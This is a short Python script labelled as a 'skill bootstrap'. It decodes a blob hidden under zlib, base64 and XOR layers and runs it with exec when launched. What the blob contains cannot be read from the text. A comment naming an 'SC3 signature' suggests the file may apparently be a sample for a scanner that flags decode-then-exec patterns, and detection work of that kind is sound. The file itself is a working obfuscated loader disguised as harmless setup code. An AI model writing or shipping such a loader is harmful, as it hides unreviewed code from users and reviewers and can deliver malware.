#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxtU0nTqkgQ/EF94DVb4+EdBGRrBBWD7ca+KGqzCM2vfz1fTMzMYY4ZFVmZVZXldSBB+Zx/tI3gJ5UqoYtl1yhFasyl8AIe3Tkl2zzUHXtbJUthCrqSS2dC4YQb7VOZX2Oe7J4P5s4+6koS5cGCDYsLytW9mWuhoVrJ0pLQeXHaTCyi7/2vOtmgrd/B1ecvDD9Z3ZmcW834dcZVrS0F7965+lMV1YEM2iP36yZg6L/raIlBdjhL9/fDg/6SmLquZCHz8yFem3GMrzI+ljs42qEQeZSGD2KcADW2s+F/E3O3ZFJi1MP13kZLNfixzPRF6hDn6cPKQok8rg5PD4JrvaLgIfC8qE5EOPfpk74rS042NGti53zNbYFFNAaHT+mJ/TY4awUTfkmB/MQindr7axALs4sP2fMoRQmpXy/FC+R4Aa0Eglmwb7zoxWOyuK0N7nBINS2OTy6aSegRephtw5fyeDRANpdk/7B5fKky94DD2xnx0ujeKtZfizls5KiDgnuNJH8N4sVvHKBvTXpCyi3idMVXeai1BKuZHnRVKhOYSZoD7fALfQFFDFscr+7O1WT3J/EMGpc/hljTOVqZJHwsjUN4SfCacbCo/NOf8GJ/VrNHEsh4cedcNtXNvmExeI2B6K4q6tQGbxWs+AEvIyxRdEbpk1MKazcO6JPNw0bsjd9Tfgmnwv7pZ18XrrCQvtilvPfbhlfr//X8t9tEYp8aF84LhV+kttm8c+sdzb0cvicZpDnXHR1WV7xY0MDY5pIGB2/VaSp80wmLLtvXiOEF1VF95zC0oPaf/KSlwfIOLmu3sv3WCMMbx5fAD+8K3rVYlFhcG+gerwj41+Affz96wb9+vW2Rqgjj3f0UaLB7h+FyiLBAngbQJsLyAQuK3puc2lI3Fya8tFiTw00qT3JXzibdgfv3PaXuwP7zC6319+8/XqM3LQ=="
_K = bytes.fromhex("150eb798c8298b4e034473dc")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
